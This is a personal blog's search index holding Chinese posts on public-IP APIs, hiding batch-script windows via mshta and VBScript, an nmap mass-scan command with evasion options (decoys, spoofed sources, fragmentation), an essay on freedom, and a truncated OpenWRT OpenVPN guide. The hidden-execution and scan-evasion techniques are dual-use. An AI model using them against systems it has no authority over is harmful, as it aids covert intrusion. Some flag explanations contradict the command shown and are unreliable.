<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>公网IP查询API</title>
    <link href="/2025/06/10/WEB/%E5%85%AC%E7%BD%91IP%E6%9F%A5%E8%AF%A2API/"/>
    <url>/2025/06/10/WEB/%E5%85%AC%E7%BD%91IP%E6%9F%A5%E8%AF%A2API/</url>
    
    <content type="html"><![CDATA[<h2 id="ipv4"><a href="#ipv4" class="headerlink" title="ipv4"></a>ipv4</h2><ol><li><p><strong><code>api.ipify.org</code></strong></p><ul><li><strong>URL</strong>: <a href="https://api.ipify.org/">https://api.ipify.org</a> &#x2F; <a href="https://api4.ipify.org/">https://api4.ipify.org</a> &#x2F; <a href="https://api64.ipify.org/">https://api64.ipify.org</a> </li><li><strong>返回格式</strong>: 支持纯文本、JSON、XML 等多种格式，通过 <code>format=json</code> 参数指定格式。</li><li><strong>特点</strong>:  <ul><li>无速率限制，适合高频次调用。  </li><li>长期稳定，被多个开源项目和开发者推荐。</li></ul></li></ul></li><li><p><strong><code>checkip.amazonaws.com</code></strong></p><ul><li><strong>URL</strong>: <a href="https://checkip.amazonaws.com/">https://checkip.amazonaws.com</a> </li><li><strong>返回格式</strong>: 纯文本  </li><li><strong>特点</strong>:  <ul><li>亚马逊 AWS 提供的服务，稳定性极高。  </li><li>适合追求简单性和可靠性的场景。</li></ul></li></ul></li><li><p><strong><code>api-ipv4.ip.sb/ip</code></strong></p><ul><li><strong>URL</strong>: <a href="https://api-ipv4.ip.sb/ip">https://api-ipv4.ip.sb/ip</a> </li><li><strong>返回格式</strong>: 纯文本  </li><li><strong>特点</strong>:  <ul><li>阿里云旗下的 Cloudflare CDN 提供的查询接口，稳定性极高。</li><li>适合国内使用场景。</li></ul></li></ul></li></ol><h2 id="ipv6"><a href="#ipv6" class="headerlink" title="ipv6"></a>ipv6</h2><ol><li><p><strong><code>api6.ipify.org</code></strong>  </p><ul><li><strong>URL</strong>: <a href="https://api6.ipify.org/">https://api6.ipify.org</a></li><li><strong>返回格式</strong>: 支持纯文本、JSON、XML 等多种格式，通过 <code>format=json</code> 参数指定格式。</li><li><strong>特点</strong>:  <ul><li>无速率限制，适合高频次调用。  </li><li>长期稳定，被多个开源项目和开发者推荐。</li></ul></li></ul></li><li><p><strong><code>v6.ident.me</code></strong>  </p><ul><li><strong>URL</strong>: <a href="https://v6.ident.me/">https://v6.ident.me</a></li><li><strong>返回格式</strong>: 纯文本 </li><li><strong>特点</strong>：<ul><li>同时支持ipv4和ipv6，也支持http和https。</li><li>运行情况较稳定，社区使用广泛。</li><li>注：可能依赖个人或小团队维护，不保证长期 SLA。</li></ul></li></ul></li><li><p><strong><code>api-ipv6.ip.sb</code></strong>  </p><ul><li><strong>URL</strong>: <a href="https://api-ipv6.ip.sb/ip">https://api-ipv6.ip.sb/ip</a></li><li><strong>返回格式</strong>: 纯文本 </li><li><strong>特点</strong>：<ul><li>阿里云旗下的 Cloudflare CDN 提供的查询接口，稳定性极高。</li><li>适合国内使用场景。</li></ul></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bat脚本隐藏命令行窗口执行</title>
    <link href="/2025/06/03/%E7%B3%BB%E7%BB%9F/windows/bat%E8%84%9A%E6%9C%AC%E9%9A%90%E8%97%8F%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/06/03/%E7%B3%BB%E7%BB%9F/windows/bat%E8%84%9A%E6%9C%AC%E9%9A%90%E8%97%8F%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AA%97%E5%8F%A3%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="bat-脚本隐藏命令行窗口执行"><a href="#bat-脚本隐藏命令行窗口执行" class="headerlink" title="bat 脚本隐藏命令行窗口执行"></a>bat 脚本隐藏命令行窗口执行</h2><h3 id="使用-mshta-启动隐藏窗口"><a href="#使用-mshta-启动隐藏窗口" class="headerlink" title="使用 mshta 启动隐藏窗口"></a>使用 <code>mshta</code> 启动隐藏窗口</h3><p>在批处理文件中添加以下代码，可以通过 <code>mshta</code> 启动自身，并隐藏窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs batch">@echo off<br>if &quot;%1&quot;==&quot;h&quot; goto begin<br>start mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,0)(window.close)&amp;&amp;exit<br>:begin<br>REM 在此处添加您的脚本内容<br></code></pre></td></tr></table></figure><p>此方法利用 <code>mshta</code> 和 VBScript 创建一个隐藏的窗口来运行批处理脚本。</p><hr><h3 id="使用-VBScript-脚本执行-cmd-命令"><a href="#使用-VBScript-脚本执行-cmd-命令" class="headerlink" title="使用 VBScript 脚本执行 cmd 命令"></a>使用 VBScript 脚本执行 cmd 命令</h3><p>新建一个 <code>.vbs</code> 文件，内容如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> <span class="hljs-attribute">ws</span>=createobject(&quot;wscript.shell&quot;)<br>ws.<span class="hljs-built_in">run</span>(<span class="hljs-string">&quot;cmd /c hostname&quot;</span>),vbhide<br></code></pre></td></tr></table></figure><p>替换 <code>cmd /c</code> 后的内容为你需要执行的命令，比如 <code>cmd /c start chrome</code>。</p><ul><li><p>cmd &#x2F;c：通过命令行执行后续的 cmd 命令。</p></li><li><p>0：设置窗口样式为隐藏（vbHide）。</p></li><li><p>False：不等待命令执行完成，脚本继续执行。</p></li></ul><hr><h3 id="配合使用-VBScript-隐藏窗口"><a href="#配合使用-VBScript-隐藏窗口" class="headerlink" title="配合使用 VBScript 隐藏窗口"></a>配合使用 VBScript 隐藏窗口</h3><p>创建一个 <code>.vbs</code> 文件，通过 VBScript 调用批处理文件，并设置窗口隐藏：</p><ol><li><p>打开记事本，输入以下内容：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> WshShell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)<br>WshShell.Run <span class="hljs-string">&quot;cmd.exe /c &quot;&quot;C:\路径\到\您的脚本.bat&quot;&quot;&quot;</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">Set</span> WshShell = <span class="hljs-literal">Nothing</span><br></code></pre></td></tr></table></figure></li></ol><p>请将 <code>&quot;C:\路径\到\您的脚本.bat&quot;</code> 替换为您的批处理文件的实际路径。</p><ol start="2"><li><p>将文件保存为 <code>.vbs</code> 扩展名，例如 <code>run_hidden.vbs</code>。</p></li><li><p>双击运行该 <code>.vbs</code> 文件，您的批处理脚本将以隐藏窗口的方式执行。</p></li></ol><h2 id="计划任务隐藏-bat-脚本命令行窗口"><a href="#计划任务隐藏-bat-脚本命令行窗口" class="headerlink" title="计划任务隐藏 bat 脚本命令行窗口"></a>计划任务隐藏 bat 脚本命令行窗口</h2><h3 id="在任务计划程序中直接调用-mshta"><a href="#在任务计划程序中直接调用-mshta" class="headerlink" title="在任务计划程序中直接调用 mshta"></a>在任务计划程序中直接调用 <code>mshta</code></h3><p>在任务计划程序中配置任务时，在“操作”选项卡中设置：</p><ul><li><strong>程序或脚本</strong>：<code>mshta</code></li><li><strong>添加参数</strong>：<code>vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;C:\路径\到\您的脚本.bat&quot;&quot;&quot;,0)(window.close)</code></li></ul><p>请将 <code>C:\路径\到\您的脚本.bat</code> 替换为您的批处理文件的实际路径。</p><h3 id="使用-VBScript-启动批处理文件"><a href="#使用-VBScript-启动批处理文件" class="headerlink" title="使用 VBScript 启动批处理文件"></a>使用 VBScript 启动批处理文件</h3><p>创建一个 <code>.vbs</code> 文件，通过 VBScript 启动批处理文件，并设置窗口隐藏：</p><ol><li><p>打开记事本，输入以下内容：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> WshShell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)<br>WshShell.Run <span class="hljs-string">&quot;C:\路径\到\您的脚本.bat&quot;</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">Set</span> WshShell = <span class="hljs-literal">Nothing</span><br></code></pre></td></tr></table></figure></li></ol><p>请将 <code>C:\路径\到\您的脚本.bat</code> 替换为您的批处理文件的实际路径。</p><ol start="2"><li><p>将文件保存为 <code>.vbs</code> 扩展名，例如 <code>run_hidden.vbs</code>。</p></li><li><p>在任务计划程序中配置任务，设置“操作”中的“程序或脚本”为：</p><p><code>wscript.exe</code></p><p>“添加参数”为：</p><p><code>&quot;C:\路径\到\run_hidden.vbs&quot;</code></p></li></ol><p>这样可以通过 VBScript 启动批处理文件，并隐藏命令提示符窗口。</p>]]></content>
    
    
    <categories>
      
      <category>系统</category>
      
      <category>windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nmap</title>
    <link href="/2025/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/nmap/"/>
    <url>/2025/05/14/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/nmap/</url>
    
    <content type="html"><![CDATA[<h1 id="官网：https-nmap-org"><a href="#官网：https-nmap-org" class="headerlink" title="官网：https://nmap.org"></a>官网：<a href="https://nmap.org/">https://nmap.org</a></h1><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="示例1：大量主机全端口快速扫描"><a href="#示例1：大量主机全端口快速扫描" class="headerlink" title="示例1：大量主机全端口快速扫描"></a>示例1：大量主机全端口快速扫描</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -iL ip<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span>- -sS -sV -T4 -Pn -n <span class="hljs-attr">--min-rate</span> <span class="hljs-number">1000</span> <span class="hljs-attr">--min-parallelism</span> <span class="hljs-number">512</span> <span class="hljs-attr">--min-hostgroup</span> <span class="hljs-number">4</span> <span class="hljs-attr">--max-retries</span> <span class="hljs-number">1</span> <span class="hljs-attr">--host-timeout</span> <span class="hljs-number">30</span>m <span class="hljs-attr">--scan-delay</span> <span class="hljs-number">100ms</span> <span class="hljs-attr">--max-scan-delay</span> <span class="hljs-number">500ms</span> <span class="hljs-attr">--open</span> -v -oA out<br></code></pre></td></tr></table></figure><h3 id="命令解释："><a href="#命令解释：" class="headerlink" title="命令解释："></a>命令解释：</h3><ul><li>-iL ip.txt 从文件读取所有目标 IP 段</li><li>-p- 确保扫描所有端口（1–65535）</li><li>-sS 快速且隐蔽的 SYN 扫描</li><li>-sV 获取服务版本信息，较 -A 更高效</li><li>-T4 选用快速模板，兼顾速度和可靠性</li><li>-Pn 跳过主机发现，直接扫目标列表</li><li>-n 关闭 DNS 解析，减少延时</li><li>–min-rate 500 高并发发包（低：100–300，中：300-500，高：750–1000）</li><li>–min-parallelism 512 高并发探测端口（低：64–128，中：256–512，高：750–1024）</li><li>–min-hostgroup 4 批量轮询多个主机，减少空闲等待</li><li>–max-retries 2 最多重试 2 次，避免过度等待（默认重试10次）</li><li>–host-timeout 30m 单主机最长 30 分钟，防止拖慢整体扫描</li><li>–scan-delay 100ms 每包至少等待 100ms，避免触发目标限速</li><li>–max-scan-delay 500ms 若 Nmap 检测到丢包，可自动增长延迟，但不超过 500ms</li><li>–open 过滤闭合端口，只列出开放端口条目</li><li>-v 输出更详细进度，便于监控</li><li>-oA out 同时输出三种格式，便于整理与留存</li></ul><p>该命令兼顾扫描速度与覆盖率，并保留丰富的输出格式和可调参数，适合对千级 IP 进行全端口互联网暴露面扫描。</p><h1 id="帮助手册（中文版）："><a href="#帮助手册（中文版）：" class="headerlink" title="帮助手册（中文版）："></a>帮助手册（中文版）：</h1><p>以下是对应的 Nmap 帮助文档中文翻译，保持原有结构和简洁风格。</p><h2 id="目标说明"><a href="#目标说明" class="headerlink" title="目标说明"></a>目标说明</h2><p>可以传入主机名、IP 地址、网络等<br>示例：<code>scanme.nmap.org</code>、<code>microsoft.com/24</code>、<code>192.168.0.1; 10.0.0-255.1-254</code></p><ul><li><code>-iL &lt;输入文件&gt;</code>：从主机&#x2F;网络列表文件读取</li><li><code>-iR &lt;主机数&gt;</code>：随机选择目标</li><li><code>--exclude &lt;主机1[,主机2][,主机3],…&gt;</code>：排除指定主机&#x2F;网络</li><li><code>--excludefile &lt;排除文件&gt;</code>：从文件中读取排除列表</li></ul><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><ul><li><code>-sL</code>：列出扫描目标（不实际发送探测）</li><li><code>-sn</code>：Ping 扫描，仅检测存活主机，不扫描端口</li><li><code>-Pn</code>：跳过主机发现，将所有主机视为在线</li><li><code>-PS/PA/PU/PY[端口列表]</code>：对给定端口发送 TCP SYN、ACK、UDP 或 SCTP 探测</li><li><code>-PE/PP/PM</code>：发送 ICMP 回显、时间戳或子网掩码请求</li><li><code>-PO[协议列表]</code>：IP 协议探测</li><li><code>-n</code>&#x2F;<code>-R</code>：分别表示“从不做 DNS 解析”&#x2F;“始终解析”（默认：有时解析）</li><li><code>--dns-servers &lt;服务器1[,服务器2],…&gt;</code>：指定自定义 DNS 服务器</li><li><code>--system-dns</code>：使用操作系统 DNS 解析器</li><li><code>--traceroute</code>：对每台主机执行跳点跟踪</li></ul><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><ul><li><code>-sS</code>&#x2F;<code>-sT</code>&#x2F;<code>-sA</code>&#x2F;<code>-sW</code>&#x2F;<code>-sM</code>：TCP SYN、Connect()、ACK、Window、Maimon 扫描</li><li><code>-sU</code>：UDP 扫描</li><li><code>-sN</code>&#x2F;<code>-sF</code>&#x2F;<code>-sX</code>：TCP Null、FIN、Xmas 扫描</li><li><code>--scanflags &lt;标志&gt;</code>：自定义 TCP 标志位</li><li><code>-sI &lt;僵尸主机[:探测端口]&gt;</code>：Idle（空闲）扫描</li><li><code>-sY</code>&#x2F;<code>-sZ</code>：SCTP INIT、COOKIE-ECHO 扫描</li><li><code>-sO</code>：IP 协议扫描</li><li><code>-b &lt;FTP 中继主机&gt;</code>：FTP 弹跳扫描</li></ul><h2 id="端口指定及扫描顺序"><a href="#端口指定及扫描顺序" class="headerlink" title="端口指定及扫描顺序"></a>端口指定及扫描顺序</h2><ul><li><code>-p &lt;端口范围&gt;</code>：只扫描指定端口<br>示例：<code>-p22</code>；<code>-p1-65535</code>；<code>-p U:53,111,137,T:21-25,80,139,8080,S:9</code></li><li><code>--exclude-ports &lt;端口范围&gt;</code>：排除指定端口</li><li><code>-F</code>：快速模式，只扫描常见端口</li><li><code>-r</code>：顺序扫描端口（不随机）</li><li><code>--top-ports &lt;数量&gt;</code>：扫描最常见的 N 个端口</li><li><code>--port-ratio &lt;比例&gt;</code>：扫描出现频率高于指定比例的端口</li></ul><h2 id="服务-版本探测"><a href="#服务-版本探测" class="headerlink" title="服务&#x2F;版本探测"></a>服务&#x2F;版本探测</h2><ul><li><code>-sV</code>：探测开放端口上的服务及版本信息</li><li><code>--version-intensity &lt;级别&gt;</code>：设置探测强度，0（最轻）到 9（最全）</li><li><code>--version-light</code>：仅用最可能的探针（强度 2）</li><li><code>--version-all</code>：尝试所有探针（强度 9）</li><li><code>--version-trace</code>：显示详细探测过程（调试用）</li></ul><h2 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h2><ul><li><code>-sC</code>：等同于 <code>--script=default</code></li><li><code>--script=&lt;Lua 脚本&gt;</code>：逗号分隔的脚本目录、脚本文件或脚本类别列表</li><li><code>--script-args=&lt;参数列表&gt;</code>：为脚本提供参数，如 <code>n1=v1,n2=v2</code></li><li><code>--script-args-file=&lt;文件名&gt;</code>：从文件中读取脚本参数</li><li><code>--script-trace</code>：显示脚本发送和接收的所有数据</li><li><code>--script-updatedb</code>：更新脚本数据库</li><li><code>--script-help=&lt;Lua 脚本&gt;</code>：显示脚本帮助信息</li></ul><h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><ul><li><code>-O</code>：启用操作系统检测</li><li><code>--osscan-limit</code>：仅对有希望识别的目标进行 OS 检测</li><li><code>--osscan-guess</code>：更激进地猜测操作系统</li></ul><h2 id="时间与性能"><a href="#时间与性能" class="headerlink" title="时间与性能"></a>时间与性能</h2><p>（带 <code>&lt;时间&gt;</code> 的选项可用秒为单位，或附加 <code>ms</code>、<code>s</code>、<code>m</code>、<code>h</code>）</p><ul><li><code>-T&lt;0-5&gt;</code>：设置时间模板（值越大速度越快）</li><li><code>--min-hostgroup</code>&#x2F;<code>--max-hostgroup &lt;大小&gt;</code>：并行扫描时的主机分组大小</li><li><code>--min-parallelism</code>&#x2F;<code>--max-parallelism &lt;探针数&gt;</code>：并行探针数</li><li><code>--initial-rtt-timeout</code>&#x2F;<code>--min-rtt-timeout</code>&#x2F;<code>--max-rtt-timeout &lt;时间&gt;</code>：往返超时设置</li><li><code>--max-retries &lt;次数&gt;</code>：探针重试上限</li><li><code>--host-timeout &lt;时间&gt;</code>：目标超时放弃时间</li><li><code>--scan-delay</code>&#x2F;<code>--max-scan-delay &lt;时间&gt;</code>：探针间延迟调整</li><li><code>--min-rate</code>&#x2F;<code>--max-rate &lt;每秒探针数&gt;</code>：速率下限&#x2F;上限</li></ul><h2 id="防火墙-IDS-绕过与欺骗"><a href="#防火墙-IDS-绕过与欺骗" class="headerlink" title="防火墙&#x2F;IDS 绕过与欺骗"></a>防火墙&#x2F;IDS 绕过与欺骗</h2><ul><li><code>-f</code>；<code>--mtu &lt;值&gt;</code>：分片数据包（可指定 MTU）</li><li><code>-D &lt;诱饵1,诱饵2[,ME],…&gt;</code>：使用诱饵主机混淆扫描来源</li><li><code>-S &lt;源地址&gt;</code>：伪造源 IP</li><li><code>-e &lt;网络接口&gt;</code>：指定网络接口</li><li><code>-g</code>&#x2F;<code>--source-port &lt;端口号&gt;</code>：指定源端口</li><li><code>--proxies &lt;URL1[,URL2],…&gt;</code>：通过 HTTP&#x2F;SOCKS4 代理中继</li><li><code>--data &lt;十六进制数据&gt;</code>：附加自定义负载</li><li><code>--data-string &lt;ASCII 字符串&gt;</code>：附加 ASCII 字符串</li><li><code>--data-length &lt;长度&gt;</code>：附加随机数据</li><li><code>--ip-options &lt;选项&gt;</code>：指定 IP 选项</li><li><code>--ttl &lt;值&gt;</code>：设置 IP 生存时间</li><li><code>--spoof-mac &lt;MAC 地址/前缀/厂商&gt;</code>：伪造 MAC 地址</li><li><code>--badsum</code>：发送错误校验和的数据包</li></ul><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><ul><li><code>-oN</code>&#x2F;<code>-oX</code>&#x2F;<code>-oS</code>&#x2F;<code>-oG &lt;文件&gt;</code>：以普通、XML、脚本输出或可 grep 格式保存</li><li><code>-oA &lt;基名&gt;</code>：同时以三种主要格式保存</li><li><code>-v</code>（-vv、-vvv…）：增加详细级别</li><li><code>-d</code>（-dd、-ddd…）：增加调试级别</li><li><code>--reason</code>：显示端口状态的原因</li><li><code>--open</code>：仅显示“开放”或“可能开放”端口</li><li><code>--packet-trace</code>：显示所有收发数据包</li><li><code>--iflist</code>：打印本地接口及路由（调试用）</li><li><code>--append-output</code>：追加而非覆盖输出文件</li><li><code>--resume &lt;文件&gt;</code>：恢复中断的扫描</li><li><code>--noninteractive</code>：禁用交互式键盘操作</li><li><code>--stylesheet &lt;路径/URL&gt;</code>：为 XML 指定 XSL 样式表</li><li><code>--webxml</code>：在 XML 中引用 Nmap.Org 的样式表</li><li><code>--no-stylesheet</code>：不在 XML 中关联样式表</li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ul><li><code>-6</code>：启用 IPv6 扫描</li><li><code>-A</code>：同时启用 OS 探测、版本探测、脚本扫描和 traceroute</li><li><code>--datadir &lt;目录&gt;</code>：指定 Nmap 数据文件位置</li><li><code>--send-eth</code>&#x2F;<code>--send-ip</code>：使用以太网帧或 IP 数据包发送</li><li><code>--privileged</code>&#x2F;<code>--unprivileged</code>：假定有&#x2F;无原始套接字权限</li><li><code>-V</code>：打印版本号</li><li><code>-h</code>：打印帮助摘要</li></ul><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><ul><li><code>nmap -v -A scanme.nmap.org</code></li><li><code>nmap -v -sn 192.168.0.0/16 10.0.0.0/8</code></li><li><code>nmap -v -iR 10000 -Pn -p 80</code></li></ul><p>更多选项及示例详见手册页：<a href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>黑客工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>自由进化论：从甜筒到山海的诗意迁徙</title>
    <link href="/2025/04/25/%E9%9A%8F%E6%83%B3/%E8%87%AA%E7%94%B1%E8%BF%9B%E5%8C%96%E8%AE%BA%EF%BC%9A%E4%BB%8E%E7%94%9C%E7%AD%92%E5%88%B0%E5%B1%B1%E6%B5%B7%E7%9A%84%E8%AF%97%E6%84%8F%E8%BF%81%E5%BE%99/"/>
    <url>/2025/04/25/%E9%9A%8F%E6%83%B3/%E8%87%AA%E7%94%B1%E8%BF%9B%E5%8C%96%E8%AE%BA%EF%BC%9A%E4%BB%8E%E7%94%9C%E7%AD%92%E5%88%B0%E5%B1%B1%E6%B5%B7%E7%9A%84%E8%AF%97%E6%84%8F%E8%BF%81%E5%BE%99/</url>
    
    <content type="html"><![CDATA[<h3 id="自由进化论：从甜筒到山海的诗意迁徙"><a href="#自由进化论：从甜筒到山海的诗意迁徙" class="headerlink" title="自由进化论：从甜筒到山海的诗意迁徙"></a><strong>自由进化论：从甜筒到山海的诗意迁徙</strong></h3><h4 id="【冰淇淋自由：甜味的启蒙】"><a href="#【冰淇淋自由：甜味的启蒙】" class="headerlink" title="【冰淇淋自由：甜味的启蒙】"></a><strong>【冰淇淋自由：甜味的启蒙】</strong></h4><p>「童年是玻璃罐里的彩虹糖， 踮起脚尖才能碰到柜台上的光」<br>小时候的自由，是攥着硬币冲向小卖部的雀跃，是舔着甜筒时黏腻的手指与风。那时的世界很小，欲望透明，以为尝遍所有口味的冰淇淋，就能解锁人生的全部甜度。 </p><p><em>——自由是货架上触手可及的夏天，是融化在手心的第一滴勇敢。</em></p><h4 id="【手机自由：触屏世界的钥匙】"><a href="#【手机自由：触屏世界的钥匙】" class="headerlink" title="【手机自由：触屏世界的钥匙】"></a><strong>【手机自由：触屏世界的钥匙】</strong></h4><p>「课桌下藏着另一个宇宙， 指尖划开像素的门」<br>少年时渴望一部手机，像渴望一张通往成人世界的通行证。锁屏密码是青春期的摩斯电码，聊天框里藏着心跳的暗号。流量、电量、父母的目光——自由是电量满格时无人监管的深夜，是偷来的时间在虚拟疆域里攻城略地。</p><p><em>——自由是信号塔下的秘密花园，是拇指与屏幕合谋的叛逆诗篇。</em></p><h4 id="【零钱自由：独立宣言的前奏】"><a href="#【零钱自由：独立宣言的前奏】" class="headerlink" title="【零钱自由：独立宣言的前奏】"></a><strong>【零钱自由：独立宣言的前奏】</strong></h4><p>「月光是大学账单上的赤字， 也是第一笔自我赡养的勋章」<br>成年礼从一张银行卡开始。奶茶自由、电影自由、说走就走的聚餐自由……数字在余额与欲望间走钢丝，却也织就了经济独立的雏形。学会在“想要”与“需要”间谈判，自由开始有了重量——它藏在月末精打细算的Excel表里，也藏在任性下单时微微发烫的支付指纹中。</p><p><em>——自由是钱包与野心的博弈场，是独当一面的经济微积分。</em></p><h4 id="【出行自由：丈量世界的野心】"><a href="#【出行自由：丈量世界的野心】" class="headerlink" title="【出行自由：丈量世界的野心】"></a><strong>【出行自由：丈量世界的野心】</strong></h4><p>「996是困住风筝的线，年假是挣脱地心引力的咒语」<br>工作后的自由，是GPS上闪烁的坐标，是机票尾单与请假条的合谋。不再需要父母的签字，却开始与KPI、房贷、调休周旋。但那些攒下的里程数、行李箱上的托运标签、朋友圈定位的异国晚霞——都在宣告：自由是方向盘后的风，是护照页里未盖章的疆域。</p><p><em>——自由是车轮与机翼切割地平的弧线，是996之外对生活主权的温柔暴动。</em></p><h4 id="【自由之上：永恒的未完待续】"><a href="#【自由之上：永恒的未完待续】" class="headerlink" title="【自由之上：永恒的未完待续】"></a><strong>【自由之上：永恒的未完待续】</strong></h4><p>「自由是流动的河， 此岸的终点即下一程的渡口」<br>后来才懂，自由从不是某个目标的抵达，而是欲望与能力的动态平衡。孩童时为一支冰淇淋雀跃，成年后为一程山海跋涉，未来或许为一片星空停留……自由在进化，而我们也终将明白：</p><p><em>——真正的自由，是允许自己永远“想要”，并永远相信“可能”。</em></p><hr><h3 id="【自由的三重悖论】"><a href="#【自由的三重悖论】" class="headerlink" title="【自由的三重悖论】"></a><strong>【自由的三重悖论】</strong></h3><ol><li><strong>被动自由</strong>：儿童期冰淇淋自由受父母经济支配，成年后旅行自由受假期制度限制——自由永远与约束共生。  </li><li><strong>自由异化</strong>：手机自由带来信息焦虑，零钱自由陷入消费主义陷阱——工具理性常吞噬价值理性。  </li><li><strong>自由代价</strong>：独身者享受决策自由却承受孤独，婚姻中的妥协换取归属感——自由本质是代价的权衡艺术。</li></ol><h3 id="【自由终局：河流与大海的隐喻】"><a href="#【自由终局：河流与大海的隐喻】" class="headerlink" title="【自由终局：河流与大海的隐喻】"></a><strong>【自由终局：河流与大海的隐喻】</strong></h3><p>「自由不是某个目标的抵达，而是存在状态的永恒流动」<br>从马斯洛的“自我实现”到马克思的“自由王国”，从孩童紧握硬币的手到老者凝视夕阳的眼，自由始终在三个维度共振：  </p><ul><li><strong>物质自由</strong>：资源支配权的基础保障（冰淇淋→财务自由）  </li><li><strong>精神自由</strong>：认知与选择的独立性（手机密码→思想主权）  </li><li><strong>关系自由</strong>：他者共在中的平衡（家庭责任→社会贡献）</li></ul><p>最终，自由成为赫拉克利特之河：此岸的欲望催生下一程的可能，而真正的自由，是允许自己既是奔流的河水，又是静观河流的岸。  </p>]]></content>
    
    
    <categories>
      
      <category>随想</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>原版OpenWRT配置OpenVPN</title>
    <link href="/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/"/>
    <url>/2025/03/31/%E7%B3%BB%E7%BB%9F/ARM/OpenWRT%E9%85%8D%E7%BD%AEOpenVPN/</url>
    
    <content type="html"><![CDATA[<h2 id="证书密钥文件生成"><a href="#证书密钥文件生成" class="headerlink" title="证书密钥文件生成"></a>证书密钥文件生成</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ol><li><strong>安装OpenVPN以及所需工具</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">opkg update<br>opkg install luci-app-openvpn<br>opkg install openvpn-openssl<br>opkg install openvpn-easy-rsa<br></code></pre></td></tr></table></figure></li></ol><h3 id="服务端证书生成"><a href="#服务端证书生成" class="headerlink" title="服务端证书生成"></a>服务端证书生成</h3><h4 id="1-初始化PKI目录"><a href="#1-初始化PKI目录" class="headerlink" title="1. 初始化PKI目录"></a>1. 初始化PKI目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/openvpn<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">easyrsa init-pki<br></code></pre></td></tr></table></figure><h4 id="2-生成根证书（CA）"><a href="#2-生成根证书（CA）" class="headerlink" title="2. 生成根证书（CA）"></a>2. 生成根证书（CA）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">easyrsa build-ca nopass<br></code></pre></td></tr></table></figure><h4 id="3-生成服务端证书及私钥"><a href="#3-生成服务端证书及私钥" class="headerlink" title="3. 生成服务端证书及私钥"></a>3. 生成服务端证书及私钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">easyrsa build-server-full server nopass<br></code></pre></td></tr></table></figure><h4 id="4-生成客户端证书及私钥"><a href="#4-生成客户端证书及私钥" class="headerlink" title="4. 生成客户端证书及私钥"></a>4. 生成客户端证书及私钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">easyrsa build-client-full client1 nopass<br></code></pre></td></tr></table></figure><blockquote><p>后续新增用户只需修改client1为不同名称（如client2、client3）</p></blockquote><h4 id="5-生成Diffie-Hellman参数"><a href="#5-生成Diffie-Hellman参数" class="headerlink" 